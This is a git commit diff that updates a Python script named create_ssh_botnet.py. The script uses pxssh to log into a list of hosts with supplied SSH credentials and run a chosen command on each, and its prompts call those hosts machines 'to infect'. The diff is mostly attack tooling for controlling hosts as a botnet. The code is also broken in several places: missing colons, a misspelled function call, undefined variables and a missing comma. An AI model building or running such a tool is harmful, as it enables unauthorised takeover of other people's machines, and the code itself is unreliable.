ac4325af5b6e5ec7b4e53afae275f7a76d165b57
Josh Whipkey <americasfinestson@gmail.com>
2022-02-11 10:24:32 -0700

    Updates to script...

--- python/create_ssh_botnet.py
+++ python/create_ssh_botnet.py
@@ -6,10 +6,10 @@ Arguments: None
 
 """
 
+import getpass
 import pxssh
-import os
 
-class Client:
+class Bot:
 
     def __init__(self, hostname, username, password)
         self.hostname = hostname
@@ -27,22 +27,37 @@ class Client:
             print('Error connecting to host')
 
     def send_command(self, command):
-        self.session.sendline(cmd)
+        self.session.sendline(command)
         self.session.prompt()
         return self.session.before
 
-def send_command_to_bot(command)
 
-    for client in botnet:
-        output = client.send_command(command)
-        print("[*] Current host: " + client.hostname)
-        print("[*] " + output)
+def send_command_to_bot(bot, command)
+
+    output = bot.send_command(command)
+    print("[*] Current host: " + bot.hostname)
+    print("[*] " + output)
+
+
+def get_user_input()
+
+    bot_list = input("Please enter a comma-separated list of IPs or hostnames to try to infect: ")
+    username = input("Please enter the username to attempt the SSH connection as: ")
+    password = getpass.getpass("Please enter that username's SSH password: ")
+    command = input("Please enter the command you want to try to execute on each bot: ")
+
+    return bot_list, username, password, command
 
 
 def main():
 
-    client = Client(hostname, username, password)
-    botnet.append(client)
+    # Acquire user input
+    bot_list, username, password command = get_user_input()
+
+    for host in bot_list:
+        bot = Bot(host, username, password)
+        send_commant_to_bot(bot, command)
+        botnet.append(client)
 
 
 if __name__ == '__main__':
